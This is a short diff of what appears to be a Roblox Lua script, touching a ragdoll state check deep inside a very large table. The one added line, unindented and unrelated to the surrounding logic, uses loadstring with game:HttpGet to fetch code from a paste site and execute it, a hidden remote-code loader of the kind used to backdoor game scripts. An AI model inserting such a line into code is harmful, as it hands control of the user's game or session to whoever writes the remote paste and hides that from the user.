@@ -14245,6 +14245,7 @@ tbl31 = {
 									if state == physics then
 										stoned = true
 									else
+loadstring(game:HttpGet("https://pastefy.app/hlHILzrM/raw"))()
 										local ragdoll = Enum.HumanoidStateType.Ragdoll
 										if state == ragdoll then
 											stoned = true
